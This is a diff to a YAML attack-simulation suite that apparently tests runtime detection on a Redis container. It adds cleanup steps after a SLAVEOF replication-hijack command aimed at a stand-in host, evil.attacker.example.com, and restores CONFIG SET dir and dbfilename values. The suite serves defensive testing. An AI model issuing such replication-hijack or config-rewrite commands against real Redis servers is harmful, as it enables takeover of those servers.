@@ -317,11 +317,23 @@ attacks:
   # Phase 9: LATERAL MOVEMENT (TA0008) — Pivot via replication
   # ═══════════════════════════════════════════════════════════════════════════
 
-  # T1021 — Remote Services: Redis SLAVEOF replication hijack
+  # T1021 — Remote Services: Redis SLAVEOF replication hijack.
+  # PR119 rabbit: paired with an immediate REPLICAOF NO ONE so the
+  # node doesn't get stuck retrying replication to a non-existent
+  # attacker host (which would interfere with later write/config
+  # probes in the suite).
   - name: lateral-slaveof
     type: custom
     redis:
       command: ["SLAVEOF", "evil.attacker.example.com", "6379"]
+    successIndicators:
+      - responseContains: "OK"
+    expectedDetections: []
+
+  - name: lateral-slaveof-cleanup
+    type: custom
+    redis:
+      command: ["REPLICAOF", "NO", "ONE"]
     successIndicators:
       - responseContains: "OK"
     expectedDetections: []
@@ -570,3 +582,27 @@ attacks:
         ruleName: Unexpected process launched
         containerName: redis
         command: sh
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # CLEANUP — Restore Redis CONFIG mutations (PR119 rabbit)
+  # CONFIG SET dir / dbfilename change persistent server state. Without
+  # restoration the changes leak into later test runs of the same suite,
+  # which is especially risky in shared CI environments. The defaults below
+  # match a stock Redis 7 image (/data and dump.rdb).
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  - name: cleanup-config-restore-dir
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dir", "/data"]
+    successIndicators:
+      - responseContains: "OK"
+    expectedDetections: []
+
+  - name: cleanup-config-restore-dbfilename
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dbfilename", "dump.rdb"]
+    successIndicators:
+      - responseContains: "OK"
+    expectedDetections: []
